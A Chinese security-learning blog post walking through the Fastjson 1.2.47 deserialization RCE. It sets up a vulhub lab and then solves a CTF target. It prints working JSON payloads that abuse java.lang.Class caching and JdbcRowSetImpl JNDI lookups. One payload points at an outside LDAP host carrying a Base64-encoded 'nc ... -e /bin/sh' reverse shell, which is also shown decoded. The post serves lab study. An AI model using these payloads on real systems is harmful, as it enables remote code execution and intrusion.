+++
title = "Fastjson反序列化  1.2.47"
date = 2026-06-20T11:10:55+08:00
draft = false
description = "Java 安全学习"
tags = ["Java安全"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
+++

# 原理


 Fastjson 1.2.47 之前的漏洞利用了以下特性：

  1. autotype 黑名单绕过 - 通过 java.lang.Class 的特殊处理机制，先将恶意类加载到缓存
  2. JNDI 注入 - 通过 JdbcRowSetImpl 类触发 JNDI 连接，加载远程恶意类执行代码



# 过程


这里我们用jar包来进行搭建测试     当然也可以 docker 来进行  这里我们用 docker 来运行 

不得不说  p神的 vulnhub  真的夯

环境搭建

```c
cd vulhub/fastjson/1.2.47-rce
docker compose up -d
```

访问 

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619092632469.png)

然后本地启动环境

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619094943317.png)



![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619094932095.png)



开始bp 抓包


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619094950752.png)



```c
{
      "a": {
          "@type": "java.lang.Class",
          "val": "com.sun.rowset.JdbcRowSetImpl"
      },
      "b": {
          "@type": "com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName": "rmi://117.71.143.98:1099/Exploit",
          "autoCommit": true
      }
  }
```


开始发送  就能获取到了




# 实战


这里用  极核  CTF  的靶场 来进行 

抓登录页面的包  删去后面的  大括号  出现  500报错  经典的  fastjson 


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619100819712.png)

这里我们用 jnd  开启  1389 端口实现 ldap （轻型目录访问协议） 远程命令加载   8080端口当中的开放  恶意 class 服务  

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619101806950.png)


然后用vps  进行监听   

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619102046430.png)


构造如下数据包，将dataSourceName中的LDAP地址换为自己公网服务器的LDAP地址，其中需要将ldap://43.136.76.42:1389/Basic/Command/Base64/bmMgNDMuMTM2Ljc2LjQyIDEyMzQ1IC1lIC9iaW4vc2g=   当中的     bmMgNDMuMTM2Ljc2LjQyIDEyMzQ1IC1lIC9iaW4vc2g=  进行解码  替换成  自己的

nc 43.136.76.42 12345 -e /bin/sh    这是解码后的



```c
{

"a":{

"@type":"java.lang.Class",

"val":"com.sun.rowset.JdbcRowSetImpl"

},

"b":{

"@type":"com.sun.rowset.JdbcRowSetImpl",

"dataSourceName":"ldap://43.136.76.42:1389/Basic/Command/Base64/bmMgNDMuMTM2Ljc2LjQyIDEyMzQ1IC1lIC9iaW4vc2g=",

"autoCommit":true

}

}
```



![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619102537582.png)


发现已经弹过来了


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619102627979.png)

然后获取到flag 

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619102712883.png)




























